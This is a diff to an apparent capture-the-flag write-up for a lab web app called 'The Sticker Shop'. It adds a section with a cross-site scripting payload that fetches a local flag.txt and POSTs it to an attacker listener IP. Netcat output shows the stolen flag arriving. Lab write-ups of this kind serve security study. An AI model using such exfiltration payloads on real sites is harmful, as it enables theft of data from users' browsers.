@@ -60,7 +60,52 @@ A quick and dirty way of doing this would be embedding ```flag.txt```'s contents
 
 ![Quick and dirty GET flag](/img/the_sticker_shop/flag_get.png)
 
+---
+### Beyond Pwn
+
 But what if you want to read a file that is much larger, or you don't want the data to be visible in the URL, perhaps for greater stealth? In that case, you would be better off using POST instead of GET.
+For unstructured data, sending data as plaintext will suffice.
+
+```html
+<script>
+function sendData(data){
+	fetch("http://10.13.48.55", {
+		method: "POST",
+		headers: {
+			"Content-Type": "text/plain"
+		},
+		body: data
+	})
+}
+
+fetch("http://127.0.0.1:8080/flag.txt")
+	.then(response => response.text())
+	.then(data => {
+		sendData(data)
+	})
+</script>
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 80
+listening on [any] 80 ...
+connect to [10.13.48.55] from (UNKNOWN) [10.10.102.204] 60968
+POST / HTTP/1.1
+Host: 10.13.48.55
+Connection: keep-alive
+Content-Length: 45
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
+Content-Type: text/plain
+Accept: */*
+Origin: http://127.0.0.1:8080
+Referer: http://127.0.0.1:8080/
+Accept-Encoding: gzip, deflate
+
+THM{<flag>}
+```
+
+For structured data, using json may be a better option.
 
 ```html
 <script>
@@ -82,7 +127,7 @@ But what if you want to read a file that is much larger, or you don't want the d
 </script>
 ```
 
-The problem is that Python's simple HTTP server only supports GET and HEAD requests, and the sticker website is sending a preflight request, so netcat is out of the question as well...
+The problem is that the browser sends a preflight request due to the content type, so netcat is out of the question...
 
 ```
 ┌──(kali㉿kali)-[/tmp]
